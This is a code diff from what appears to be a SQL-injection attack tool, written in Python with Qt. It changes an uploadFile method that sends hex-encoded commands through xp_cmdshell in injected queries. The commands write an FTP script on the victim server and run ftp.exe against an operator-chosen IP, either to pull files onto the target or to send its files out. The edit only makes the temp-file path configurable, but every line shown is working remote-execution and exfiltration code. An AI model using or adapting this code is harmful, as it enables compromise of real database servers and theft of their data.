@@ -526,35 +526,36 @@ class ErrorBased(QtCore.QThread):
 #Upload file using built-in ftp.exe 
     def uploadFile(self):
         ftpFiles = self.vars['ftpFiles']
+        tmp_file = self.vars['ftpPath'] + "ftp.txt"
         execCmd = self.dbType('exec_cmdshell')
         #del ..\temp\ftp.txt /Q
-        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del ..\\temp\\ftp.txt /Q")})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del " + tmp_file + " /Q")})
         self.web_request(query, True)
         #echo login> ..\temp\ftp.txt
-        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo " + self.vars['login'] + "> ..\\temp\\ftp.txt")})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo " + self.vars['login'] + "> " + tmp_file)})
         self.web_request(query, True)
         #echo password>> ..\temp\ftp.txt
-        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo " + self.vars['password'] + ">> ..\\temp\\ftp.txt")})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo " + self.vars['password'] + ">> " + tmp_file)})
         self.web_request(query, True)
         for file in ftpFiles:
             #Use SEND or GET ftp command?
             if self.vars['ftp_mode'] == "get":
                 #echo get file.exe c:\path\file.exe>> ..\temp\ftp.txt
                 query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo get " + file + " "\
-                                    + self.vars['ftpPath'] + file + ">> ..\\temp\\ftp.txt")})
+                                    + self.vars['ftpPath'] + file + ">> " + tmp_file)})
             else:
                 #echo send c:\path\file.exe>> ..\temp\ftp.txt
                 query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo send " + self.vars['ftpPath']\
-                                    +  file + ">> ..\\temp\\ftp.txt")})
+                                    +  file + ">> " + tmp_file)})
             self.web_request(query, True)
         #echo bye>> ..\temp\ftp.txt
-        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo bye>> ..\\temp\\ftp.txt")})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo bye>> " + tmp_file)})
         self.web_request(query, True)
         #ftp -s:..\temp\ftp.txt IP
-        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("ftp -s:..\\temp\\ftp.txt " + self.vars['ip'])})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("ftp -s:" + tmp_file + " " + self.vars['ip'])})
         self.web_request(query, True)
         #del ..\temp\ftp.txt /Q
-        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del ..\\temp\\ftp.txt /Q")})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del " + tmp_file + " /Q")})
         self.web_request(query, True)
     
 #Enable OPENROWSET request
